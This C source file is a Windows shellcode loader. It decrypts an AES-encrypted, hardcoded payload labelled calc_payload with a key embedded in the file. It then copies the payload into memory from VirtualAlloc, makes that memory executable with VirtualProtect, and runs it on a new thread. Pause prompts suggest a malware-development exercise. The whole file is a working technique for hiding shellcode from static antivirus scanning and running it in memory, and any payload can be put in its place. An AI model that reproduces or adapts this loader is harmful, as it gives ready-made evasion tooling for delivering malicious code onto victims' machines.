
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>



int AESDecrypt(unsigned char * payload, DWORD payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
    char key[] = { 0xcc, 0xfa, 0x7c, 0x6b, 0x4a, 0x24, 0x80, 0x87, 0xf, 0x82, 0xc4, 0xcd, 0x8f, 0x47, 0x3b, 0x7f };
    unsigned char calc_payload[] = { 0xa4, 0x11, 0x10, 0xf, 0x6b, 0x4f, 0xb7, 0x5d, 0x17, 0x63, 0x34, 0xe6, 0xcb, 0x67, 0x58, 0x5a, 0x53, 0x84, 0x99, 0xfc, 0xa0, 0x9e, 0x22, 0x63, 0x69, 0x87, 0xd1, 0xfa, 0x39, 0x94, 0xe8, 0xce, 0x78, 0x67, 0xa7, 0x52, 0x4, 0x29, 0x46, 0xc, 0x3c, 0xb4, 0xfd, 0x68, 0xd6, 0x92, 0x6f, 0xd7, 0x1f, 0xc2, 0xe9, 0x5, 0xd7, 0xaa, 0x66, 0xed, 0xa9, 0x3, 0x48, 0x8f, 0x3b, 0xf3, 0x58, 0xc7, 0x1a, 0x7f, 0xdc, 0x8a, 0xfd, 0x93, 0x12, 0x0, 0x71, 0x71, 0x76, 0x55, 0x48, 0x60, 0x92, 0x77, 0xad, 0x95, 0x7e, 0xbf, 0x6b, 0xa2, 0x37, 0xf, 0xa, 0xc8, 0x88, 0x71, 0x2a, 0xfd, 0xb3, 0x41, 0x1c, 0xfc, 0xb2, 0x68, 0x92, 0x23, 0x9c, 0xcb, 0x72, 0x92, 0xc4, 0x4a, 0x1d, 0x5e, 0x42, 0x28, 0x51, 0x6b, 0x38, 0x3b, 0xaf, 0x28, 0x99, 0x82, 0xd3, 0x9c, 0x1b, 0xce, 0x73, 0xfa, 0x91, 0x4d, 0x20, 0x11, 0x5e, 0x85, 0xc3, 0xd1, 0x45, 0xaa, 0x5a, 0x83, 0x6a, 0x23, 0xe7, 0x70, 0x86, 0xe8, 0x8f, 0x88, 0x9c, 0x66, 0xb, 0xcb, 0xec, 0x5f, 0xe4, 0xf8, 0xa6, 0x0, 0xd3, 0x36, 0xb9, 0x46, 0xf2, 0xf, 0xff, 0x6f, 0x2d, 0xaf, 0x2f, 0x3f, 0x9a, 0x8d, 0x23, 0x92, 0x64, 0x3d, 0x58, 0x1a, 0xc9, 0xb7, 0x68, 0x85, 0x32, 0x7c, 0xa3, 0xe, 0x2f, 0x76, 0xe5, 0x97, 0x89, 0x42, 0x6a, 0x5e, 0xa4, 0xfe, 0xd3, 0x77, 0x78, 0xc4, 0x46, 0x55, 0x4, 0xfc, 0xc3, 0x7b, 0x3a, 0xc5, 0x20, 0x11, 0xe2, 0xaa, 0x4f, 0x5f, 0x7b, 0x3e, 0x84, 0xb0, 0x39, 0xa4, 0xa5, 0x2c, 0xc0, 0x7a, 0x2b, 0xad, 0x9c, 0x1d, 0xe8, 0xb4, 0xe8, 0xec, 0xf3, 0xd5, 0x7d, 0xb4, 0x4d, 0x5d, 0x8e, 0xce, 0x49, 0x31, 0xad, 0xc7, 0xee, 0xc0, 0x7, 0x6d, 0x29, 0x75, 0x1, 0xf2, 0x3, 0x92, 0x7d, 0x86, 0x13, 0x2d, 0xe, 0xce, 0x38, 0xcd, 0x78, 0xdb, 0xd0, 0xe8, 0xd5, 0x89, 0xb4, 0xca, 0x61, 0xb5, 0xc8, 0xc4, 0x2b, 0x3, 0xf5, 0xc0, 0xf7, 0x7e, 0x8d, 0xdb, 0x2a, 0xa, 0x5c, 0x6f, 0x35, 0x82, 0x4f, 0x9b, 0x24, 0x75, 0x86, 0x54, 0x2d, 0x53, 0x92, 0x3a, 0x39, 0x2a, 0xd6, 0xb3, 0xf, 0x78, 0x24, 0x14, 0x21, 0x1a, 0x6f, 0xcb, 0xfb, 0xe5, 0xe5, 0xc4, 0xd8, 0xbd, 0xc2, 0x25, 0x2a, 0xb2, 0x97, 0x97, 0xaf, 0x72, 0xa8, 0xf6, 0xce, 0xa, 0x60, 0x1b, 0x5b, 0x9e, 0x66, 0x12, 0xd3, 0xfc, 0xc5, 0xb8, 0xee, 0xf7, 0xb8, 0x27, 0xdd, 0x95, 0xd4, 0x68, 0xc9, 0x78, 0x2a, 0x80, 0xa, 0x35, 0x90, 0x1e, 0xce, 0x9b, 0xc4, 0x98, 0x11, 0xc0, 0x8f, 0x35, 0x6a, 0x68, 0xfb, 0x0, 0xc4, 0x76, 0xf2, 0x86, 0x9c, 0x8e, 0xe7, 0x91, 0x55, 0x45, 0x11, 0x7f, 0x81, 0x64, 0x33, 0x1c, 0x36, 0x3d, 0x38, 0xdf, 0x37, 0x1e, 0xea, 0x97, 0xa6, 0x2c, 0x2f, 0x5c, 0x7c, 0x47, 0x92, 0x26, 0xd7, 0x58, 0x53, 0x43, 0x55, 0x61, 0xa9, 0xc6, 0x35, 0x8, 0x86, 0xa9, 0x29, 0x15, 0xba, 0xc, 0xb8, 0x8d, 0x48, 0xcf, 0x6d, 0x20, 0x84, 0x9, 0x54, 0xb0, 0x63, 0x64, 0x18, 0x57, 0xe, 0xbe, 0x5f, 0xa0, 0xbf, 0xde, 0xe2, 0xa7, 0xb5, 0xa7, 0x1e, 0xa4, 0x28, 0xce, 0x47, 0xa7, 0x1e, 0x15, 0x30, 0xcf, 0x8a, 0x5f, 0xd0, 0xd1, 0xe8, 0x31, 0x93, 0x96, 0x72, 0xa9, 0xd9, 0xcc, 0xbf, 0xb2, 0x77, 0xe4, 0x2d, 0x85, 0x68, 0x68, 0x48, 0x86, 0xd1, 0xef, 0x52, 0xa7, 0x32, 0xa9, 0x3, 0xb7, 0x80, 0xef, 0x21, 0xde, 0xdd, 0x5a, 0x28, 0x22, 0xa0, 0x29, 0x49, 0x25, 0x4a, 0xa9, 0x2f, 0x70, 0x4a, 0x5e, 0x58, 0xb8, 0xbb, 0x17, 0x5c, 0x4d, 0x68, 0xf9, 0xd6, 0x52, 0x3c, 0x0, 0xac, 0xc2, 0xb4, 0xd4, 0xd, 0x23, 0x3, 0xb4, 0xd4, 0xcf, 0xe6, 0xa5, 0xf3, 0xf3, 0x90, 0x6c, 0xf7, 0xa0, 0xbe, 0x84, 0x18, 0xf8, 0x22, 0x92, 0xed, 0x71, 0x16, 0x3b, 0x7a, 0x5f, 0xab, 0x97, 0x4a, 0x44, 0xe5, 0x82, 0xf0, 0x85, 0xa9, 0xcc, 0xcf, 0x91, 0xd2, 0x94, 0xc9, 0x46, 0xf9, 0x11, 0xf3, 0xfd, 0x5a, 0x63, 0xe3, 0xa0, 0x70, 0x52, 0x12, 0xda, 0x8c, 0xcc, 0x84, 0x0, 0x97, 0x32, 0xfd, 0x45, 0xc2, 0x72, 0xc9, 0xc4, 0x71, 0x14, 0x8b, 0xa9, 0x89, 0x76, 0x12, 0x94, 0xa, 0x34, 0xbe, 0xd4, 0xf7, 0xdd, 0x2f, 0x26, 0x19, 0xb8, 0x8b, 0x40, 0xf3, 0x96, 0x97, 0xea, 0xbf, 0x14, 0xa2, 0x52, 0xbf, 0x8a, 0x69, 0xa2, 0x27, 0x38, 0x52, 0x5d, 0xc9, 0x57, 0xaf, 0x98, 0x6b, 0x15, 0x74, 0x93, 0xd7, 0x2b, 0xd6, 0xa, 0x1c, 0xdc, 0x84, 0xa3, 0x94, 0xab, 0xcc, 0xc2, 0x11, 0xfa, 0x72, 0xea, 0xac, 0x84, 0xde, 0x84, 0xb2, 0xbb, 0xa6, 0xab, 0xe0, 0x29, 0x63, 0x49, 0xc3, 0x7b, 0x86, 0xe8, 0xf2, 0x26, 0xd0, 0x7c, 0xc4, 0x12, 0x4d, 0x8d, 0xa9, 0xcd, 0x5, 0x68, 0x2, 0x7, 0xe7, 0x75, 0xa3, 0xe1, 0x55, 0x96, 0xd5, 0x4b, 0x84, 0x75, 0xbc, 0xb9, 0x4e, 0x16, 0x38, 0xca, 0x36, 0x12, 0x8a, 0x4d, 0xc0, 0xc2, 0xc3, 0x12, 0x11, 0x8c, 0x29, 0xfa, 0x8e, 0x88, 0x42, 0x3, 0x8, 0x90, 0xaf, 0xd3, 0x17, 0xa2, 0x21, 0x7f, 0x1b, 0xf4, 0x33, 0xe8, 0x5d, 0xb, 0xf3, 0x3d, 0x98, 0x77, 0x4b, 0x79, 0xe7, 0xf, 0x57, 0xb, 0xab, 0x1f, 0xe4, 0x2d, 0xc2, 0x4, 0xe9, 0xe4, 0x6d, 0x65, 0x9, 0xaa, 0x85, 0xa1 };
	
	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt(calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	else { printf("Something went wrong"); }

	return 0;
}

